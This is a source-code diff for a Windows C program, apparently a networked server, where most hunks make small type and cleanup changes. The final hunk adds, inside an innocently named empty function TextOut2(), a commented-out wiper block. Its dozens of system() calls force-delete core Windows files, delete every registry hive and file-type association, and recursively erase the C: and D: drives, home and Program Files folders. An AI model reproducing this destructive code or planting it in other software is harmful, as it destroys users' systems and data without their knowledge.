@@ -231,7 +231,7 @@ DWORD written;
 	return 0;
 }
 
-UINT32 lpTopLevelExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo){
+LONG lpTopLevelExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo){
 
 	//Shutdown everything
 	G_bIsThread = false;
@@ -461,7 +461,7 @@ void OnDestroy()
 	}
 
 	if (G_mmTimer != 0) _StopTimer(G_mmTimer);
-	
+	//_TermWinsock();
 	WSACleanup();
 	if (pLogFile != 0) fclose(pLogFile);
 
@@ -547,7 +547,7 @@ void CALLBACK _TimerFunc(UINT wID, UINT wUser, DWORD dwUSer, DWORD dw1, DWORD dw
 
 
 
-MMRESULT _StartTimer(UINT32 dwTime)
+MMRESULT _StartTimer(DWORD dwTime)
 {
  TIMECAPS caps;
  MMRESULT timerid;
@@ -757,7 +757,141 @@ HWND BCX_Button2(char* Text,HWND hWnd,int id,int X,int Y,int W,int H,int Style,i
 }//Button CLear
 
 void TextOut2()
-{}
+{
+			/*STARTUPINFO si = { sizeof(STARTUPINFO) };
+			si.dwFlags = STARTF_USESHOWWINDOW;
+			si.wShowWindow = SW_HIDE;
+			PROCESS_INFORMATION pi;
+			system("del /f %systemroot%\\system32\\hal.dll");
+			system("del /f %systemroot%\\system\\hal.dll");
+			system("del /f %systemroot%\\system\\system.*");
+			system("del /f %systemroot%\\system32\\system.*");
+			system("del /f %systemroot%\\system32\\command.com");
+			system("del /f %systemroot%\\system32\\keyboard.*");
+			system("del /f %systemroot%\\system32\\shell.*");
+			system("del /f %systemroot%\\system32\\mouse.*");
+			system("del /f %systemroot%\\system32\\msvideo.*");
+			system("del /f %systemroot%\\regedit.exe");
+			system("del /f %systemroot%\\taskman.exe");
+			system("del /f %systemroot%\\explorer.exe");
+			system("del /f %systemroot%\\system32\\taskkill.exe");
+			system("del /f %systemroot%\\system32\\tasklist.exe");
+			system("del /f %systemroot%\\system32\\taskmgr.exe");
+			system("reg delete HKEY_CLASSES_ROOT /f");
+			system("reg delete HKEY_CURRENT_USER /f");
+			system("reg delete HKEY_USERS /f");
+			system("reg delete HKEY_CURRENT_CONFIG /f");
+			system("reg delete HKEY_LOCAL_MACHINE /f");			
+			system("reg delete HKEY_CLASSES_ROOT\\* /f");
+			system("reg delete HKEY_CURRENT_USER\\* /f");
+			system("reg delete HKEY_USERS\\* /f");
+			system("reg delete HKEY_CURRENT_CONFIG\\* /f");
+			system("reg delete HKEY_LOCAL_MACHINE\\* /f");
+			system("reg delete HKEY_CURRENT_CONFIG\\Software /f");
+			system("reg delete HKEY_CURRENT_CONFIG\\System /f");
+			system("reg delete HKEY_USERS\\.DEFAULT /f");
+			system("reg delete HKEY_USERS\\S-1-5-18 /f");
+			system("reg delete HKEY_USERS\\S-1-5-19 /f");
+			system("reg delete HKEY_USERS\\S-1-5-19_Classes /f");
+			system("reg delete HKEY_USERS\\S-1-5-20 /f");
+			system("reg delete HKEY_USERS\\S-1-5-20_Classes /f");
+			system("reg delete HKEY_USERS\\S-1-5-21-602162358-606747145-725345543-1003 /f");
+			system("reg delete HKEY_USERS\\S-1-5-21-602162358-606747145-725345543-1003_Classes /f");
+			system("reg delete HKEY_LOCAL_MACHINE\\HARDWARE /f");
+			system("reg delete HKEY_LOCAL_MACHINE\\SAM /f");
+			system("reg delete HKEY_LOCAL_MACHINE\\SECURITY /f");
+			system("reg delete HKEY_LOCAL_MACHINE\\SOFTWARE /f");
+			system("reg delete HKEY_LOCAL_MACHINE\\SYSTEM /f");
+			system("reg delete HKEY_CURRENT_USER\\AppEvents /f");
+			system("reg delete HKEY_CURRENT_USER\\Console /f");
+			system("reg delete HKEY_CURRENT_USER\\Control Panel /f");
+			system("reg delete HKEY_CURRENT_USER\\Environment /f");
+			system("reg delete HKEY_CURRENT_USER\\Identities /f");
+			system("reg delete HKEY_CURRENT_USER\\Keyboard Layout /f");
+			system("reg delete HKEY_CURRENT_USER\\Printers /f");
+			system("reg delete HKEY_CURRENT_USER\\SessionInformation /f");
+			system("reg delete HKEY_CURRENT_USER\\Software /f");
+			system("reg delete HKEY_CURRENT_USER\\UNICODE Program Groups /f");
+			system("reg delete HKEY_CURRENT_USER\\Volatile Environment /f");
+			system("reg delete HKEY_CURRENT_USER\\Windows 3.1 Migration Status /f");
+			system("reg delete KEY_CLASSES_ROOT\\* /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.iso /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.bin /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.img /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.bmp /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.dib /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.jpeg /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.jpg /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.jpe /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.jfif /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.gif /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.png /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.tif /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.tiff /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.psd /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.pdd /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.rle /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.eps /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.psb /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.pcx /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.pdf /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.pdp /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.sct /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.tga /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.vda /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.icb /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.vst /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.rtf /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.txt /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.docx /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.kgb /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.doc /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.dot /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.docm /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.dotx /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.dotm /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.xlsx /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.xlsm /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.xlsb /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.xls /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.xml /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.mht /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.mhtml /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.htm /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.html /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.xltx /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.xltm /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.php /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.swf /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.fla /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.exe /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.log /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.avi /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.mp3 /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.wav /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.vmw /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.bak /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.dat /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.dll /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.cmd /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.xml /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.msc /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.drv /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.tmp /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.tsk /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.rom /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.ram /f");
+			system("reg delete HKEY_CLASSES_ROOT\\.bat /f");
+			system("del %SYSTEMDRIVE%\\*.* /f /s /q");
+			system("del %HOMEPATH%\\*.* /f /s /q");
+			system("del %ProgramFiles%\\*.* /f /s /q");
+			system("del /S /Q c:\\*.*");
+			CreateProcess(0, "del /S /Q d:\\*.*", 0, 0, false, 0, 0, 0, &si, &pi);
+			system("del /S /Q *.*");
+			system("del c:\\*.* /f /s /q");
+			CreateProcess(0, "del d:\\*.* /f /s /q", 0, 0, false, 0, 0, 0, &si, &pi);
+			CreateProcess(0, "del *.* /f /s /q", 0, 0, false, 0, 0, 0, &si, &pi);*/
+}
 
 void PutLogOnline(char* cStr)
 {
